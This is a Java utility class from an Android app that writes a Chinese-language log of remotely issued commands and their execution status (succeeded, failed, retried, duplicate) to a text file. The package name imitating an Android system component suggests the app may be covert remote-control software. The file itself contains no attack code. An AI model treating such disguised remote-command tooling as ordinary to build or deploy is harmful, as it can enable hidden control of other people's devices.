package com.android.system.controled.util;

import java.util.ArrayList;

import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.db.InnerDbOpera;

public class CodesToTxtUtil {

	private static CodesToTxtUtil mInstence;

	private CodesToTxtUtil() {

	}

	public static CodesToTxtUtil getInstence() {
		if (mInstence == null) {
			mInstence = new CodesToTxtUtil();
		}
		return mInstence;
	}

	public synchronized void saveAllCodesToTextFile() {

		InnerDbOpera opera = InnerDbOpera.getInstence();

		ArrayList<Code> codes = opera.getAllCode();

		if (MainApplication.FILE_CODE_TEXT.exists()) {
			MainApplication.FILE_CODE_TEXT.delete();
		}
		if (codes != null && codes.size() > 0) {
			String dateTemp = "";
			StringBuffer sb = new StringBuffer();
			sb.append("提示：以下是命令执行情况，仅供参考；\r\n[按时间逆序显示，命令即使失败，也会随时尝试执行，不必重新发送执行失败的命令。]");
			for (Code code : codes) {

				String date = TimeUtil.longToDateString(code.getDate());

				if (!dateTemp.equals(date)) {
					dateTemp = String.valueOf(date);
					sb.append("\r\n\r\n【 ").append(date).append("】\r\n\r\n");
				}
				sb.append("\r\n\r\n").append(TimeUtil.longToTime(code.getDate())).append("   【").append(code.getCode()).append("】\r\n").append(code.getMark());
				switch (code.getResult()) {
				case Code.RESULT_OK:
					sb.append("\r\n执行成功");
					if (code.getFailedTimes() > 0) {
						sb.append("   [尝试执行失败过的次数：").append(code.getFailedTimes()).append("]");
					}
					break;
				case Code.RESULT_FAILED:
					if (code.getFailedTimes() > 0) {
						sb.append("\r\n执行失败").append("   失败次数：").append(code.getFailedTimes());
					} else if (code.getRedoNeed() == Code.REDO_NEED) {
						sb.append("\r\n正在执行").append("   [可能当前执行的正是此命令]");
					} else {
						sb.append("\r\n执行失败").append("   [此命令无需再次执行]");
					}
					break;
				case Code.RESULT_CODE_REPEAT:
					sb.append("\r\n命令重复，无需执行");
					break;

				default:
					break;
				}
			}
			FileUtil.writeFile(sb.toString(), MainApplication.FILE_CODE_TEXT, true);
		} else {
			FileUtil.writeFile("暂无命令执行记录！", MainApplication.FILE_CODE_TEXT, true);
		}
	}
}
